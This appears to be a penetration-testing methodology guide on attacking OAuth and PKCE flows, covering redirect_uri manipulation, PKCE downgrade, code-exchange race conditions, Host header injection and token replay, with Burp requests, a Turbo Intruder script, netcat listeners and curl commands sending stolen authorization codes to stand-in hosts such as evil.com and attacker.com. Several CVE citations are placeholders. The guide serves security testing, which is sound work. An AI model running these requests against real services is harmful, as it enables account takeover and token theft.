# OAuth & PKCE Attacks: Complete Exploitation Methodology


---

## Table of Contents

1. [Understanding OAuth and PKCE](#understanding-oauth-and-pkce)
2. [Reconnaissance Phase](#reconnaissance-phase)
3. [Redirect URI Attacks](#redirect-uri-attacks)
4. [PKCE Downgrade Attacks](#pkce-downgrade-attacks)
5. [Authorization Code Race Conditions](#authorization-code-race-conditions)
6. [Host Header Injection for Code Theft](#host-header-injection-for-code-theft)
7. [Token Replay and Session Binding Issues](#token-replay-and-session-binding-issues)
8. [Testing Checklist](#testing-checklist)
9. [Tools Reference](#tools-reference)

---

## Understanding OAuth and PKCE

### What is PKCE?

Proof Key for Code Exchange (PKCE, pronounced "pixy") is a security extension for OAuth 2.0 designed to protect authorization codes from interception attacks . It is particularly important for public clients like mobile apps and single-page applications that cannot securely store client secrets.

**How PKCE Works:**

1. The client generates a cryptographically random string called a `code_verifier`
2. The client hashes this value to create a `code_challenge`
3. The `code_challenge` is sent in the authorization request
4. When exchanging the code for tokens, the client sends the original `code_verifier`
5. The server verifies the verifier matches the stored challenge 

### Why PKCE Matters

Without PKCE, an attacker who intercepts the authorization code can exchange it for tokens. With PKCE, the attacker would also need the `code_verifier`, which is never transmitted in the initial request and is sent over TLS .

---

## Reconnaissance Phase

### Step 1: Discover OAuth Endpoints

Start by identifying all OAuth-related endpoints on your target.

**Using Burp Suite:**
1. Configure Burp as a proxy
2. Browse the target application normally
3. Look for requests containing:
   - `/authorize`
   - `/token`
   - `/oauth`
   - `/oidc`
   - `.well-known/openid-configuration`

**Manual Discovery Commands:**

```bash
# Check OpenID configuration endpoint
curl https://target.com/.well-known/openid-configuration | jq .

# Look for supported PKCE methods
curl https://target.com/.well-known/oauth-authorization-server | jq '.code_challenge_methods_supported'
```

**Expected Output:**
- `["S256"]` - Good (only secure method)
- `["S256", "plain"]` - Vulnerable (plain method exposes secrets)
- `[]` or `null` - PKCE may be optional 

### Step 2: Identify Client Configuration

Search for exposed OAuth client configurations in public assets.

**In Browser Developer Tools:**
1. Open DevTools (F12)
2. Search all loaded JavaScript for `client_id`
3. Check `localStorage` and `sessionStorage` for OAuth tokens

**Using Burp Suite:**
1. Proxy → HTTP History
2. Filter for JS and JSON files
3. Use "Find" feature to search for `client_id`, `client_secret`, `redirect_uri`

**Using Command Line:**

```bash
# Search downloaded JavaScript files
grep -r "client_id\|client_secret" ./downloaded_assets/
```

### Step 3: Map the OAuth Flow

Document the complete OAuth flow for your target:

1. **Authorization Request** - Note all parameters
2. **User Authentication** - Identify where credentials are entered
3. **Authorization Code Return** - Capture the callback URL
4. **Token Exchange** - Observe the POST to `/token`

---

## Redirect URI Attacks

Redirect URI validation failures allow attackers to steal authorization codes by sending them to attacker-controlled domains.

### Real-World Example: Traccar CVE-2026-25649

In 2026, a critical vulnerability was discovered in Traccar's OIDC implementation where the `redirect_uri` parameter was not validated against a whitelist. Attackers could steal OAuth authorization codes by manipulating this parameter .

**Attack Flow:**
1. Attacker crafts malicious authorization URL with `redirect_uri=https://attacker.com/callback`
2. Victim clicks the link and authenticates
3. Authorization code is sent to attacker's server
4. Attacker exchanges code for access tokens
5. Attacker gains full account access 

### Testing Methodology

**Step 1: Identify the Authorization Endpoint**

Look for requests to endpoints like:
- `/oauth/authorize`
- `/oauth2/auth`
- `/authorize`

**Step 2: Test Basic Redirect Manipulation**

Using Burp Suite:
1. Capture an authorization request
2. Send to Repeater (Ctrl+R)
3. Modify the `redirect_uri` parameter to your testing domain

```http
GET /oauth/authorize?client_id=abc123&redirect_uri=https://evil.com/callback&response_type=code&scope=openid HTTP/1.1
Host: target.com
```

**Step 3: Test Common Bypass Techniques**

| Technique | Test Value | Why It Works |
|-----------|------------|--------------|
| Open redirect chain | `https://target.com/redirect?url=https://evil.com` | Uses existing redirect on target |
| Subdomain takeover | `https://old-blog.target.com` | Unused subdomain may be claimable |
| URL encoding | `https://target.com%2f%2eevil.com` | Bypasses pattern matching |
| Parameter pollution | `redirect_uri=https://target.com&redirect_uri=https://evil.com` | Server may use last parameter |

**Step 4: Monitor for Callbacks**

Set up a listening server:

```bash
# Using Python
python3 -m http.server 8080

# Using netcat
nc -lnvp 443
```

**Step 5: Check Response**

- If you receive a request with a `code` parameter, the vulnerability exists
- The code can be exchanged for tokens using the `/token` endpoint

### Real-World Testing Example

During a 2025 bug bounty engagement, a researcher discovered that Amazon's mobile app had weak token validation. The refresh token could be replayed after 48 hours with completely spoofed device metadata, including fake MAC addresses and serial numbers .

---

## PKCE Downgrade Attacks

PKCE downgrade attacks occur when the server accepts authorization requests that omit the PKCE parameters, effectively disabling the security protection.

### Real-World Example: Authentik CVE-2024-23647

In 2024, a high-severity vulnerability was discovered in Authentik (CVE-2024-23647). The server accepted authorization requests without the `code_challenge` parameter, completely bypassing PKCE protection .

**Vulnerable Behavior:**
- Server required PKCE for token exchange
- BUT did not verify that a `code_challenge` was present in the authorization request
- Attackers could remove `code_challenge` and still complete the flow 

### Testing Methodology

**Step 1: Capture a Normal PKCE Request**

Using Burp Suite:
1. Proxy → HTTP History
2. Find an authorization request containing:
   - `code_challenge=...`
   - `code_challenge_method=S256`

**Step 2: Create a Downgraded Request**

Send to Repeater and remove the PKCE parameters:

```http
# Original request
GET /oauth/authorize?client_id=abc123&redirect_uri=https://target.com/callback&response_type=code&scope=openid&code_challenge=ABC123&code_challenge_method=S256

# Downgraded request (remove PKCE)
GET /oauth/authorize?client_id=abc123&redirect_uri=https://target.com/callback&response_type=code&scope=openid
```

**Step 3: Complete the Flow**

1. Send the downgraded authorization request
2. Complete the login process
3. Capture the returned authorization code
4. Exchange the code for tokens

**Step 4: Analyze Results**

| Server Behavior | Vulnerability | Severity |
|----------------|---------------|----------|
| Code exchange fails | Proper PKCE enforcement | None |
| Code exchange succeeds | PKCE downgrade possible | Critical |

### Real-World Example: Cloudflare Workers (CVE-2025-XXXX)

In May 2025, a PKCE bypass vulnerability was found in `@cloudflare/workers-oauth-provider` versions before 0.0.5. Attackers could strip PKCE parameters to bypass protection .

**Exploitation Steps from the CVE:**
1. Intercept OAuth flow before PKCE validation
2. Strip `code_challenge` and `code_challenge_method` parameters
3. Force legacy OAuth flow due to missing server-side checks 

**Fixed Code Pattern:**

```javascript
// Vulnerable code (missing validation)
if (!req.query.code_challenge) {
    // Allowed request without PKCE
}

// Fixed code (proper validation)
if (!req.query.code_challenge) {
    throw new Error("PKCE required: code_challenge missing");
}
```

### Testing "plain" Method Acceptance

Some servers accept the insecure "plain" `code_challenge_method`, where the challenge equals the verifier .

**Test Method:**
1. Send authorization request with:
   ```
   code_challenge=mysecret123
   code_challenge_method=plain
   ```
2. Complete the flow
3. When exchanging code, send `code_verifier=mysecret123`
4. If successful, the server accepts the weak method

---

## Authorization Code Race Conditions

Race conditions in authorization code handling can allow a single code to be exchanged multiple times, potentially granting tokens for different user sessions.

### Real-World Example: $8500 Bug Bounty Discovery

In 2025, researcher Anmol Singh Yadav discovered a critical race condition in a major business platform's OAuth implementation. The server failed to invalidate authorization codes after first use, allowing parallel token exchanges to succeed .

**Attack Scenario:**
- Single `authorization_code` exchanged multiple times
- Each request used a different `code_verifier` yet still succeeded
- Server violated RFC 6749 §4.1.2 (codes must be single-use) 

### Testing Methodology with Burp Suite

**Step 1: Capture a Complete OAuth Flow**

1. Intercept the authorization request
2. Allow the user to authenticate
3. Capture the callback with the `code` parameter

**Step 2: Prepare for Race Condition Testing**

Using Burp Suite's Intruder or Turbo Intruder:

1. Send the token exchange request to Repeater
2. Note the `code` value
3. Create multiple tabs with the same request

**Step 3: Execute Parallel Requests**

Using Turbo Intruder (Extensions → Turbo Intruder):

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=50,
                           requestsPerConnection=1,
                           pipeline=False)
    
    for i in range(50):
        engine.queue(target.req, i)
        engine.queue(target.req2, i)  # Different verifier

def handleResponse(req, interesting):
    table.add(req)
```

**Step 4: Analyze Results**

- If multiple requests return 200 OK with different tokens → Race condition exists
- The second token may belong to a different user session 

**Step 5: Verify Token Validity**

```bash
# Test the obtained token
curl -X GET https://api.target.com/user/profile \
     -H "Authorization: Bearer <STOLEN_TOKEN>"
```

---

## Host Header Injection for Code Theft

When OAuth endpoints construct `redirect_uri` from the HTTP Host header instead of configuration, attackers can inject their own domain to steal authorization codes.

### Real-World Example: SignalK Server (CVE-2026-34083)

In April 2026, a vulnerability was disclosed in SignalK Server where the `redirectUri` configuration was optional, and the server fell back to using the unvalidated Host header .

**Vulnerable Code Pattern:**

```javascript
const protocol = req.secure ? 'https' : 'http'
const host = req.get('host')  // Attacker-controlled
const redirectUri = oidcConfig.redirectUri || 
                    `${protocol}://${host}${skAuthPrefix}/oidc/callback`
```

**Why This Is Dangerous:**
- The Host header comes directly from the HTTP request
- An attacker can set `Host: evil.com`
- The OIDC provider sends the authorization code to `evil.com`
- Official documentation recommended Nginx config that forwards the Host header 

### Testing Methodology

**Step 1: Identify Vulnerable Pattern**

Look for OIDC login endpoints that don't require a pre-registered `redirect_uri`.

**Step 2: Test Host Header Injection**

Using Burp Suite Repeater:

```http
GET /oauth/login HTTP/1.1
Host: evil.com
Origin: https://target.com
```

**Step 3: Observe Redirect Location**

Check the `Location` header in the response:

```http
HTTP/1.1 302 Found
Location: https://evil.com/oauth/callback?code=...
```

**Step 4: Complete the Attack**

1. Set up a server at your domain
2. Send the malicious link to a victim
3. When they authenticate, the code arrives at your server
4. Exchange the code for access tokens

### Testing with cURL

```bash
# Test for Host header injection
curl -v "https://target.com/oauth/login" \
     -H "Host: attacker.com" \
     --max-redirs 0

# Check if redirect_uri contains your domain
```

---

## Token Replay and Session Binding Issues

Tokens that lack proper session binding can be replayed from different devices or after extended periods.

### Real-World Example: Amazon Mobile App (2025)

During responsible disclosure research, C. Oscar Lawshea discovered that Amazon's OAuth implementation had multiple token weaknesses :

**Findings:**
1. **Refresh Token Replayable** - Tokens captured days earlier still functioned
2. **Device Metadata Ignored** - Spoofed MAC addresses, serial numbers, and Android IDs did not affect token issuance
3. **No Device Binding** - Tokens worked from curl on completely different machines 

**Proof of Concept:**

```bash
# 48 hours after capture, the same token still worked
curl -X GET https://api.amazon.com/user/profile \
     -H "Authorization: Bearer <TOKEN_CAPTURED_48_HOURS_AGO>"
# Returned full user profile including name, email, user ID
```

### Testing Methodology

**Step 1: Capture Tokens**

Using Burp Suite:
1. Complete OAuth flow normally
2. Capture the `access_token` and `refresh_token`
3. Save the raw requests

**Step 2: Test Token Replay**

```bash
# Test immediately
curl -H "Authorization: Bearer <TOKEN>" https://api.target.com/user/profile

# Test after delay (hours/days)
# Wait and repeat the request
```

**Step 3: Test Device Binding**

Modify device metadata in the token request:

```http
POST /oauth/token HTTP/1.1
Host: api.target.com
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token&refresh_token=TOKEN&client_id=CLIENT_ID&device_metadata={
  "mac_address": "00:11:22:33:44:55",
  "serial": "FAKE123",
  "android_id": null
}
```

**Step 4: Cross-Client Testing**

Try using the token from a different client:

```bash
# Using curl (completely different from mobile app)
curl -X GET https://api.target.com/user/profile \
     -H "Authorization: Bearer <TOKEN_FROM_APP>"
```

**Expected Results:**
- **Secure:** Token rejected or requires additional validation
- **Vulnerable:** Token accepted, returning user data 

---

## Testing Checklist

Use this checklist to ensure comprehensive OAuth/PKCE testing:

### Reconnaissance
- [ ] Discover OAuth endpoints via `.well-known`
- [ ] Identify supported `code_challenge_methods`
- [ ] Find client IDs in JavaScript and mobile binaries
- [ ] Map complete authorization flow

### Redirect URI Testing
- [ ] Test basic redirect_uri modification
- [ ] Test open redirect chains
- [ ] Test URL encoding bypasses
- [ ] Test parameter pollution
- [ ] Test subdomain takeover possibilities

### PKCE Testing
- [ ] Test authorization without `code_challenge`
- [ ] Test `plain` method acceptance
- [ ] Test downgrade by removing PKCE parameters
- [ ] Verify server rejects missing `code_verifier`

### Race Condition Testing
- [ ] Test concurrent code exchange requests
- [ ] Test code reuse after successful exchange
- [ ] Test with different `code_verifier` values

### Token Security Testing
- [ ] Test token replay after delay
- [ ] Test token from different device/IP
- [ ] Test token from different client
- [ ] Test refresh token rotation

### Host Header Testing
- [ ] Test Host header injection in OIDC flows
- [ ] Verify redirect_uri is properly validated
- [ ] Check for unsafe fallback patterns

---

## Tools Reference

### Burp Suite Configuration

**Required Extensions:**
1. **Turbo Intruder** - For race condition testing
2. **Logger++** - For detailed request/response logging
3. **JSON Beautifier** - For reading token responses

**Basic Setup:**
1. Proxy → Options → Add proxy listener (8080)
2. Install Burp certificate on test device
3. Set browser/device to use Burp proxy

### Essential Commands

**Testing PKCE Support:**

```bash
# Fetch supported methods
curl https://target.com/.well-known/oauth-authorization-server | jq '.code_challenge_methods_supported'
```

**Listening for Callbacks:**

```bash
# Python HTTP server
python3 -m http.server 8080

# Netcat listener
nc -lnvp 443

# PHP server (for logging)
php -S 0.0.0.0:8080
```

**Token Testing:**

```bash
# Test access token
curl -X GET https://api.target.com/user/profile \
     -H "Authorization: Bearer <TOKEN>"

# Exchange authorization code
curl -X POST https://target.com/oauth/token \
     -d "grant_type=authorization_code" \
     -d "code=<CODE>" \
     -d "client_id=<CLIENT_ID>" \
     -d "code_verifier=<VERIFIER>"
```

### Browser DevTools for OAuth Testing

1. **Network Tab** - Monitor all OAuth requests
2. **Application Tab** - Check localStorage/sessionStorage for tokens
3. **Console** - Test token extraction:

```javascript
// Check for tokens in storage
console.log(localStorage.getItem('access_token'));
console.log(sessionStorage.getItem('oauth_token'));

// Monitor postMessage for token delivery
window.addEventListener('message', (e) => {
    console.log('Message:', e.data);
});
```

---

## References

1. Cloudflare Workers OAuth Provider PKCE Bypass (CVE-2025-XXXX) 
2. NextAuth.js OAuth Vulnerability (GHSA-7r7x-4c4q-c4qf) 
3. OAuth Race Condition Bug Bounty ($8500) 
4. Traccar OAuth Open Redirect (CVE-2026-25649) 
5. PKCE Technical Specification (RFC 7636) 
6. Authentik PKCE Downgrade (CVE-2024-23647) 
7. Amazon OAuth Token Weakness Disclosure 
8. SignalK Server Host Header Injection (CVE-2026-34083) 
